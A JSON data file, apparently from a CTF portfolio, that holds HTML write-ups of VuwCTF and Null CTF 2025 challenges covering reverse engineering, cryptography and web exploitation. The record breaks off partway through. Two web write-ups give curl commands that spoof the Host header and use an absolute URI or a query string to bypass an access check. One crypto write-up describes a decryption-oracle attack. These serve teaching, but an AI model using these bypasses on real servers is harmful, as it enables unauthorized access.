t['next_state'] == target_state:\n\n                        return history # Return the path (the flag)\n\n                    continue\n\n\n\n                # Execute the move\n\n                # 1. Pop is already done (we separated top_of_stack)\n\n                # 2. Push the new string (reversed so first char is new top)\n\n                new_push = tuple(t['push_str'][::-1])\n\n                new_stack = stack_body + new_push\n\n                new_state = t['next_state']\n\n                \n\n                # Add to queue if not visited\n\n                state_signature = (new_state, new_stack)\n\n                if state_signature not in visited:\n\n                    visited.add(state_signature)\n\n                    # Append the input char to our history\n\n                    queue.append((new_state, new_stack, history + t['in_char']))\n\n\n\n    return \"Flag not found.\"\n\n\n\nprint(f\"Flag: {solve_vm()}\")\n\n</code></pre>\n<h3>5. The Result</h3>\n<p>Running the solver simulates the machine steps and recovers the input string that satisfies the \"Accepting State\" condition.</p>\n<p><strong>Flag:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">\nVuwCTF{VuwCTF_1s_s0_c00l_innit}\n\n</code></pre>"
            }
        ]
    },
    "Null CTF 2025": {
        "rank": "62nd place",
        "description": "Community-driven CTF with focus on real-world security scenarios.",
        "challenges": [
            {
                "id": "biglez",
                "title": "BigLez",
                "category": "Reverse Engineering",
                "tags": [
                    "crypto",
                    "aes",
                    "xor",
                    "buffer",
                    "stack",
                    "reverse",
                    "assembly",
                    "memory"
                ],
                "writeup": "<p><strong>Analysis:</strong></p>\n<ol>\n<li><strong>File Identification:</strong></li>\n</ol>\n<ul>\n<li><code>file bigLez.exe</code>: Identified as <code>PE32 executable for MS Windows 4.00 (console), Intel i386, 14 sections</code>.</li>\n<li><code>file flag.enc</code>: Identified as <code>data</code>.</li>\n</ul>\n<ol>\n<li><strong>Initial String Analysis (<code>strings bigLez.exe</code>):</strong></li>\n</ol>\n<ul>\n<li>Revealed interesting strings like <code>flag.txt</code>, <code>flag.enc</code>, <code>_flagMan</code>, <code>_sassyIV</code>, and API calls like <code>__imp__CryptImportKey@24</code>, <code>__imp__CryptAcquireContextA@20</code>, etc. This suggested Windows CryptoAPI usage for encryption.</li>\n<li>The presence of <code>.sassy</code> as a section name and <code>_sassyIV</code> hinted at an Initialization Vector (IV) being derived from this section.</li>\n</ul>\n<ol>\n<li><strong>Disassembly with <code>objdump</code>:</strong>                                                             - Disassembled <code>bigLez.exe</code> to <code>disassembly.txt</code> (<code>objdump -d bigLez.exe</code>).                 - <strong><code>_main</code> function (0x401f84):</strong> Calls <code>_intro</code> then <code>_process_magic</code>. This indicates the main flow of the program.</li>\n</ol>\n<ul>\n<li><strong><code>_intro</code> function (0x4017e1):</strong></li>\n<li>Initializes a 32-bit integer at memory address <code>0x409020</code> with the value <code>0x55aa55aa</code>.</li>\n<li>Contains a loop that runs 100 times (for <code>i</code> from 0 to 99). In each iteration, the value at <code>0x409020</code> is updated based on a byte from the <code>_intro</code> function's own machine code. The update logic is: <code>new_key = code_byte[i] ^ (current_key &lt;&lt; 5) ^ (current_key &gt;&gt; 3)</code>. The <code>shr</code> instruction implied unsigned 32-bit integer arithmetic.</li>\n<li>Calls <code>_build_stack_strings</code> to populate memory buffers with parts of a quote.            - Prints portions of these strings to the console (observed via <code>wine</code> execution).</li>\n<li><strong><code>_process_magic</code> function (0x401a87):</strong> This is the core encryption logic.</li>\n<li>Calls <code>_build_stack_strings</code> to create three strings on the stack (let's call them Str1, Str2, Str3).</li>\n<li><strong>String Construction:</strong> It dynamically builds a \"magic string\" (let's call it <code>Buffer B</code>) by concatenating specific tokens from Str1, Str2, and Str3. The tokens were selected by index after splitting the original strings using <code>strtok</code> with delimiters \" ,.?!'\".</li>\n<li>Str1: \"hehe, aren't we all chasing the light mate?\"</li>\n<li>Str2: \" Lookin' everywhere to find it,\" (Crucially, this was initially misidentified as \"for mates,\" from static analysis, but dynamic analysis showed \"to find it,\")</li>\n<li>Str3: \" everywhere but within.\"</li>\n<li>The selected tokens in order were: <code>Tokens1[0]</code> (\"hehe\"), <code>Tokens1[5]</code> (\"chasing\"), <code>Tokens1[7]</code> (\"light\"), <code>Tokens2[1]</code> (\"everywhere\"), <code>Tokens2[3]</code> (\"find\"), <code>Tokens3[2]</code> (\"within\").</li>\n<li>Concatenated <code>Buffer B</code>: <code>\"hehechasinglighteverywherefindwithin\"</code></li>\n<li><strong>XORing <code>Buffer B</code>:</strong> <code>Buffer B</code> is then XORed byte-by-byte with the final 32-bit key obtained from <code>_intro</code>, cycling through the 4 bytes of the key (<code>key_byte = key_bytes[i % 4]</code>).</li>\n<li><strong>Hashing:</strong> The XORed <code>Buffer B</code> is then hashed using <code>CryptCreateHash</code> with <code>CALG_SHA_256</code> (0x800c) and <code>CryptHashData</code>. The resulting 32-byte SHA-256 hash forms the <strong>AES key</strong>.</li>\n<li><strong>IV Generation:</strong> An IV is generated from the <code>.sassy</code> section (16 bytes at <code>0x406000</code>). Each byte of <code>.sassy</code> is XORed with a <code>magic_sum</code>. The <code>magic_sum</code> was calculated as the <code>strlen</code> of the full concatenated quote (<code>Str1 + Str2 + Str3</code>).</li>\n<li>Full concatenated quote: \"hehe, aren't we all chasing the light mate? Lookin' everywhere to find it, everywhere but within.\" (Total length 96 bytes).                                 - <code>magic_sum = 96 (0x60)</code>.                                                                  - <code>IV[i] = sassy_bytes[i] ^ 0x60</code>.</li>\n<li><strong>Encryption:</strong> The program uses <code>CryptImportKey</code> (importing a <code>PLAINTEXTKEYBLOB</code> containing the SHA-256 hash as the AES key), <code>CryptSetKeyParam</code> (to set the IV), and <code>CryptEncrypt</code> to encrypt a file (identified as <code>flag.txt</code>). The encrypted data is then written to <code>flag.enc</code>. The <code>dwFlags</code> for <code>CryptEncrypt</code> implies PKCS7 padding.</li>\n</ul>\n<p><strong>Decryption Strategy:</strong></p>\n<p>The goal is to decrypt <code>flag.enc</code>, which was created by <code>bigLez.exe</code>. Therefore, we need to reverse the encryption process:</p>\n<ol>\n<li><strong>Calculate the final 32-bit <code>key</code>:</strong> Extract the first 100 bytes of <code>_intro</code>'s code (from <code>bigLez.exe</code> at file offset <code>0xbe1</code> for 100 bytes) and simulate the key generation loop.</li>\n</ol>\n<ul>\n<li>Initial <code>key = 0x55aa55aa</code>.</li>\n<li>For each <code>code_byte</code> from <code>_intro</code>: <code>key = code_byte ^ ((key &lt;&lt; 5) &amp; 0xFFFFFFFF) ^ ((key &gt;&gt; 3) &amp; 0xFFFFFFFF)</code>.</li>\n</ul>\n<ol>\n<li><strong>Determine the \"magic string\" (<code>Buffer B</code>):</strong></li>\n</ol>\n<ul>\n<li>Str1: \"hehe, aren't we all chasing the light mate?\"</li>\n<li>Str2: \" Lookin' everywhere to find it,\"</li>\n<li>Str3: \" everywhere but within.\"</li>\n<li>Tokens selected: <code>Tokens1[0]</code>, <code>Tokens1[5]</code>, <code>Tokens1[7]</code>, <code>Tokens2[1]</code>, <code>Tokens2[3]</code>, <code>Tokens3[2]</code>.</li>\n<li>Concatenate these tokens.</li>\n</ul>\n<ol>\n<li><strong>XOR <code>Buffer B</code> with the calculated <code>key</code>:</strong> This produces the <code>XORed Buffer B</code>.</li>\n<li><strong>Calculate the AES Key:</strong> Compute the SHA-256 hash of <code>XORed Buffer B</code>. This 32-byte hash is the AES key.                                                                          5.  <strong>Calculate the IV:</strong>                                                                       - Get the 16 bytes from the <code>.sassy</code> section of <code>bigLez.exe</code> (at VMA <code>0x406000</code>).           - Calculate <code>magic_sum = strlen(Str1 + Str2 + Str3)</code> (which is 96).                         - XOR each byte of the <code>.sassy</code> section with <code>0x60</code> (<code>magic_sum &amp; 0xFF</code>) to get the 16-byte IV.</li>\n<li><strong>Decrypt <code>flag.enc</code>:</strong> Use AES-256 in CBC mode with the calculated AES key, IV, and PKCS7 unpadding.</li>\n</ol>\n<p><strong>Implementation (Python Script):</strong></p>\n<p>A Python script (<code>solve.py</code>) was developed to implement the above steps. The script reads the <code>_intro</code> code bytes and <code>flag.enc</code> directly. It performs the key derivation, magic string construction, XORing, hashing, and IV calculation. Finally, it uses <code>PyCryptodome</code> to decrypt <code>flag.enc</code>.</p>\n<p><strong>Final Flag:</strong> <code>NULLCTF{7H1S_1S_A_N1C3_PL4C3_M8}</code></p>"
            },
            {
                "id": "classically",
                "title": "Classically",
                "category": "Cryptography",
                "tags": [
                    "cipher",
                    "http",
                    "image"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We are provided with three files:</p>\n<ol>\n<li><code>main.py</code>: The encryption script.</li>\n</ol>\n<ol>\n<li><code>M.py</code>: A file containing a large 64x64 integer matrix.</li>\n</ol>\n<ol>\n<li><code>flag.txt</code>: (Which we need to recover).</li>\n</ol>\n<h3>Analysis</h3>\n<p>Examining <code>main.py</code>, we see that the script reads a flag and asserts that its length is 64 bytes. It defines a modulus <code>mod = 0x10001</code> (65537).</p>\n<p>The core logic iterates through the matrix <code>M</code> and performs the following operation:</p>\n<p>Python</p>\n<pre><code class=\"\">\nfor i in range(n):\n\n    dot = 0\n\n    for j in range(n):\n\n        dot += M[i][j] * flag[j]\n\n    result.append(dot % mod)\n\n</code></pre>\n<p>This loop represents a classic <strong>Matrix Multiplication</strong> over a finite field. The operation can be described mathematically as:</p>\n<p>M\u00d7f<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">\u200b\u2261r<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">(modP)</p>\n<p>Where:</p>\n<ul>\n<li>M is the known 64\u00d764 matrix from <code>M.py</code>.</li>\n</ul>\n<ul>\n<li>f<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">\u200b is the unknown flag vector (converted to ASCII integers).</li>\n</ul>\n<ul>\n<li>r<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\"> is the known <code>result</code> vector provided in the comments of <code>main.py</code>.</li>\n</ul>\n<ul>\n<li>P is <code>65537</code> (0x10001).</li>\n</ul>\n<h3>Solution Strategy</h3>\n<p>Since P=65537 is a prime number, we are working within the finite field F65537\u200b. This implies that the matrix M is likely invertible. To recover the flag f<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">\u200b, we simply need to compute the modular inverse of M and multiply it by the result vector r<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">:</p>\n<p>f<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">\u200b\u2261M\u22121\u00d7r<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"0.471em\"%20height=\"0.714em\"%20style=\"width:0.471em\"%20viewBox=\"0%200%20471%20714\"%20preserveAspectRatio=\"xMinYMin\"><path%20d=\"M377%2020c0-5.333%201.833-10%205.5-14S391%200%20397%200c4.667%200%208.667%201.667%2012%2053.333%202.667%206.667%209%2010%2019%206.667%2024.667%2020.333%2043.667%2041%2057%207.333%204.667%201110.667%2011%2018%200%206-1%2010-3%2012s-6.667%205-14%209c-28.667%2014.667-53.667%2035.667-75%2063-1.333%201.333-3.167%203.5-5.5%206.5s-4%204.833-5%205.5c-1%20.667-2.5%201.333-4.5%202s-4.333%201-7%201c-4.667%200-9.167-1.833-13.5-5.5S337%20184%20337%20178c0-12.667%2015.667-32.333%2047-59H213l-171-1c-8.667-6-13-12.333-13-19%200-4.667%204.333-11.333%2013-20h359c-16-25.333-24-45-24-59z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">(modP)</p>\n<p>We can automate this linear algebra using Python's <code>sympy</code> library, which supports modular matrix inversion.</p>\n<h3>Solver Script</h3>\n<p>Save this as <code>solve.py</code> in the same directory as <code>M.py</code>.</p>\n<p>Python</p>\n<pre><code class=\"\">\nfrom sympy import Matrix\n\nfrom M import M\n\n\n\n# 1. Define the parameters from the challenge\n\nMOD = 0x10001\n\nCIPHERTEXT = [\n\n    29839, 662, 50523, 15906, 32667, 25159, 5172, 11685, 5618, 62174, \n\n    54405, 34902, 12259, 59526, 12299, 37286, 6055, 16813, 42488, 40708, \n\n    7662, 24263, 24047, 55429, 64420, 18167, 36330, 18325, 61471, 559, \n\n    32085, 23807, 26543, 26886, 24249, 45980, 23360, 15196, 42894, 33054, \n\n    22073, 23786, 63308, 44883, 60088, 38633, 54798, 42893, 29049, 25567, \n\n    33563, 49913, 63714, 51666, 60112, 19656, 13133, 11756, 34277, 55622, \n\n    14539, 54580, 48536, 1337\n\n]\n\n\n\ndef solve():\n\n    print(\"[*] Converting to SymPy matrices...\")\n\n    mat_M = Matrix(M)\n\n    vec_result = Matrix(CIPHERTEXT)\n\n\n\n    print(\"[*] Calculating modular inverse (this may take a moment)...\")\n\n    try:\n\n        # SymPy's inv_mod computes the inverse within the finite field\n\n        mat_M_inv = mat_M.inv_mod(MOD)\n\n    except ValueError:\n\n        print(\"[-] Matrix is not invertible!\")\n\n        return\n\n\n\n    print(\"[*] Recovering flag vector...\")\n\n    # Multiply the inverse matrix by the result vector\n\n    vec_flag = (mat_M_inv * vec_result) % MOD\n\n\n\n    # Convert the resulting integers back to ASCII characters\n\n    flag = \"\".join([chr(int(x)) for x in vec_flag])\n\n    print(f\"[+] Flag: {flag}\")\n\n\n\nif __name__ == \"__main__\":\n\n    solve()\n\n</code></pre>\n<h3>Flag:ctf{s0lve_th3_equ4t10n5_t0_f1nd_fl4g_h3r3_w4s_easy_en0ugh_NO???}</h3>"
            },
            {
                "id": "codename-neigh-2",
                "title": "Codename Neigh 2",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "http"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>We are given a web application written in Pony, running on a Docker container. The goal is to read the <code>private/flag.html</code> file.</p>\n<h3>Analysis</h3>\n<p>The source code (<code>app/main.pony</code>) reveals the following routing configuration:</p>\n<pre><code class=\"pony\">\n    let server =\n\n      Jennet(tcplauth, env.out)\n\n        .&gt; serve_file(fileauth, \"/\", \"public/index.html\")\n\n        .&gt; serve_file(fileauth, \"/pony\", \"public/pony.html\")\n\n        .&gt; post(\"/pony/find\", PonyFind(fileauth))\n\n        .&gt; get(\"/flag\", F(fileauth)) // Target handler\n\n        .&gt; get(\"/:name\", H(fileauth))\n\n</code></pre>\n<p>The handler <code>F</code> is responsible for serving the flag. Let's examine its <code>apply</code> method:</p>\n<pre><code class=\"pony\">\n  fun apply(ctx: Context): Context iso^ =&gt;\n\n    var conn: String = \"\"\n\n                                                                                                try                                                                                           conn = ctx.request.header(\"Host\") as String\n\n    end\n\n                                                                                                let path: String = ctx.request.uri().string()\n\n    // Vulnerable Check\n\n    if (conn == \"127.0.0.1\") and not_starts_with(path, \"flag\") and not_starts_with(path, \"/flag\") then                                                                                        let fpath = FilePath(_fileauth, \"private/flag.html\")\n\n      with file = File(fpath) do\n\n        body = file.read_string(file.size()).string().array()                                     end\n\n    end\n\n    // ...                                                                                  ```\n\n\n\nThe conditions to get the flag are:                                                         1. The `Host` header must be `127.0.0.1`.\n\n2. The request URI (as returned by `ctx.request.uri().string()`) must **not** start with `flag`.                                                                                        3. The request URI must **not** start with `/flag`.\n\n\n\nThe vulnerability lies in how `ctx.request.uri().string()` behaves compared to how the router routes the request.\n\nIf we send a request with an **absolute URI** (e.g., `GET http://target/flag HTTP/1.1`), standard HTTP servers (and `Jennet`/`pony-http`) route this based on the path component (`/flag`). However, `ctx.request.uri().string()` returns the *entire* URI string provided in the request line.\n\n\n\nSo, if we send `GET http://target/flag`, the variable `path` becomes `\"http://target/flag\"`.\n\n- Does it start with `\"flag\"`? No.\n\n- Does it start with `\"/flag\"`? No.\n\n\n\nThe check passes, and the router still invokes the `/flag` handler.\n\n\n\n## Exploitation\n\nWe can use `curl` with the `--request-target` option to force sending the absolute URI in the request line, while manually setting the `Host` header to satisfy the first condition.\n\n\n\nCommand:                                                                                    ```bash                                                                                     curl -v -H \"Host: 127.0.0.1\" --request-target \"http://public.ctf.r0devnull.team:3003/flag\" \"http://public.ctf.r0devnull.team:3003/flag\"\n\n</code></pre>\n<h3>Flag                                                                                     <code>nullctf{n0w_w!th_99%_l3ss_un1nt3nd3d_s0lv3s_m4yb3!!!@}</code></h3>"
            },
            {
                "id": "codename-neigh",
                "title": "Codename Neigh",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "http"
                ],
                "writeup": "<ol>\n<li>Challenge Description:</li>\n</ol>\n<p>The challenge involved a web application written in Pony, accessible via a provided set of Docker files and source code. The goal was to retrieve a flag from a protected endpoint.</p>\n<ol>\n<li>Vulnerability Identified:</li>\n</ol>\n<p>The core vulnerability was a logic error in the <code>/flag</code> endpoint's access control. The <code>F</code> request handler in <code>app/main.pony</code> was responsible for serving the flag. It had two main checks:</p>\n<ul>\n<li>The <code>Host</code> HTTP header must be <code>127.0.0.1</code>.</li>\n<li>The request URI path (<code>ctx.request.uri().string()</code>) must NOT be exactly <code>\"/flag\"</code> or <code>\"flag\"</code>.</li>\n</ul>\n<p>The flaw lies in the second condition. While the Jennet web framework routes requests to <code>/flag</code> to this handler, the <code>ctx.request.uri().string()</code> method returns the full URI, including any query parameters. Therefore, a request to <code>/flag?anything</code> would still be routed to the <code>F</code> handler, but the <code>path</code> variable inside the handler would be <code>\"/flag?anything\"</code>, which does not match <code>\"/flag\"</code> or <code>\"flag\"</code>, thus bypassing the intended restriction.</p>\n<ol>\n<li>Exploitation Steps:</li>\n</ol>\n<p>To exploit this, the following steps were taken:    a.  <strong>Identify the target:</strong> The remote server URL was <code>http://public.ctf.r0devnull.team:3002/</code>.    b.  <strong>Spoof the Host header:</strong> Set the <code>Host</code> header to <code>127.0.0.1</code>.    c.  <strong>Bypass path check:</strong> Append a query string to the <code>/flag</code> endpoint (e.g., <code>?x</code>).</p>\n<p>The command used was: <code>curl -H \"Host: 127.0.0.1\" \"http://public.ctf.r0devnull.team:3002/flag?x\"</code></p>\n<ol>\n<li>Flag:</li>\n</ol>\n<p>The flag obtained was: <code>nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(</code></p>"
            },
            {
                "id": "gizsea",
                "title": "Gizsea",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "aes",
                    "cipher",
                    "xor",
                    "reverse"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>The challenge provides a server implementing a custom block cipher encryption scheme labeled \"Gizsea\". We are given the source code (<code>server.zig</code>) and the ability to interact with the server via netcat. The server allows us to:</p>\n<ol>\n<li>Encrypt arbitrary plaintext (hex).</li>\n<li>Decrypt arbitrary ciphertext (hex), with a validation check.</li>\n<li>Get the encrypted flag.</li>\n</ol>\n<p>The validation check (<code>isValid</code>) prevents us from decrypting any ciphertext that contains blocks identical to the encrypted flag blocks.</p>\n<h3>Crypto Analysis</h3>\n<h4>Encryption Scheme</h4>\n<p>The encryption function <code>sch3m3Encrypt</code> uses AES-128 in a custom feedback mode. For a plaintext block $P_i$ and ciphertext block $C_i$:</p>\n<p>$$C_i = \\text{AES\\_DEC}(key, P_i) \\oplus P_{i-1}$$</p>\n<p>Where $P_{-1} = IV$. Note that it uses AES <strong>Decryption</strong> primitive for the encryption process.</p>\n<h4>Decryption Scheme</h4>\n<p>The decryption function <code>sch3m3Decrypt</code> reverses the operation:</p>\n<p>$$P_i = \\text{AES\\_ENC}(key, C_i \\oplus P_{i-1})$$</p>\n<p>This confirms the relationship. If we know $C_i$ and $P_{i-1}$, we can recover $P_i$ by calculating $X = C_i \\oplus P_{i-1}$ and then applying the AES Encryption primitive to $X$.</p>\n<h3>Vulnerability                                                                                                                                                                        The vulnerability stems from the combination of a chosen-plaintext attack (CPA) and a chosen-ciphertext attack (CCA), despite the filter on the decryption oracle.</h3>\n<h4>1. IV Recovery                                                                          Since the IV is generated randomly at startup and reused for the session, we can recover it using the Encryption Oracle.</h4>\n<p>If we encrypt two blocks of zeros ($P_0 = 0, P_1 = 0$): $$C_0 = \\text{AES\\_DEC}(0) \\oplus IV$$ $$C_1 = \\text{AES\\_DEC}(0) \\oplus P_0 = \\text{AES\\_DEC}(0) \\oplus 0 = \\text{AES\\_DEC}(0)$$</p>\n<p>By XORing them: $$C_0 \\oplus C_1 = (\\text{AES\\_DEC}(0) \\oplus IV) \\oplus \\text{AES\\_DEC}(0) = IV$$</p>\n<h4>2. Flag Recovery (Oracle Manipulation)</h4>\n<p>We have the encrypted flag blocks $C_{flag\\_0}, C_{flag\\_1}, \\dots$. We want to recover $P_{flag\\_0}, P_{flag\\_1}, \\dots$.</p>\n<p>For any block $i$, we know $P_{flag\\_i} = \\text{AES\\_ENC}(C_{flag\\_i} \\oplus P_{flag\\_(i-1)})$. (For $i=0$, $P_{flag\\_(-1)} = IV$, which we just recovered).</p>\n<p>We cannot simply ask the decryption oracle to decrypt $C_{flag\\_i}$ because of the <code>isValid</code> check. However, we can construct a <strong>different</strong> ciphertext that results in the same input to the underlying AES primitive.                                                                                             We construct a 2-block ciphertext $C'_0 || C'_1$ to send to the decryption oracle:          1.  <strong>Select $C'_0$</strong>: Choose a random 16-byte block that is <strong>not</strong> present in the encrypted flag.</p>\n<ol>\n<li><strong>Get $P'_0$</strong>: We can query the decryption oracle with just $C'_0$ (or calculate it as part of the chain) to find what it decrypts to.                                                 $$P'_0 = \\text{AES\\_ENC}(C'_0 \\oplus IV)$$</li>\n<li><strong>Calculate $C'_1$</strong>: We want the second block's decryption to output our target flag block $P_{flag\\_i}$.                                                                              The decryption logic for the second block is:                                               $$P'_1 = \\text{AES\\_ENC}(C'_1 \\oplus P'_0)$$</li>\n</ol>\n<p>We want $P'_1 = P_{flag\\_i}$, which means inputs to AES must match:     $$C'_1 \\oplus P'_0 = C_{flag\\_i} \\oplus P_{flag\\_(i-1)}$$     Solving for $C'_1$:     $$C'_1 = C_{flag\\_i} \\oplus P_{flag\\_(i-1)} \\oplus P'_0$$</p>\n<ol>\n<li><strong>Verify</strong>: Check if our calculated $C'_1$ happens to be in the encrypted flag blocks. If it is (collision), pick a new random $C'_0$ and retry.</li>\n<li><strong>Exploit</strong>: Send $C'_0 || C'_1$ to the decryption oracle. The returned second block of plaintext is the flag block $P_{flag\\_i}$.</li>\n</ol>\n<h3>Solution Script Summary</h3>\n<ol>\n<li>Connect to the server.</li>\n<li>Retrieve the Encrypted Flag.</li>\n<li>Encrypt 32 bytes of zeros to recover the IV.</li>\n<li>Iterate through each block of the encrypted flag:</li>\n</ol>\n<ul>\n<li>Generate random $C'_0$.</li>\n<li>Query oracle to get $P'_0$.</li>\n<li>Calculate required $C'_1$.</li>\n<li>Query oracle with $C'_0 || C'_1$ to get the flag block.</li>\n<li>Update $P_{prev}$ for the next iteration.</li>\n</ul>\n<ol>\n<li>Print the flag.</li>\n</ol>\n<p><strong>Flag:</strong> <code>nullctf{z1g_z4g_cr7pt0_fl1p_fl0p}</code></p>"
            },
            {
                "id": "netfilter-nightmare",
                "title": "Netfilter Nightmare",
                "category": "Reverse Engineering",
                "tags": [
                    "xor",
                    "web",
                    "assembly",
                    "binary analysis",
                    "pcap",
                    "shark"
                ],
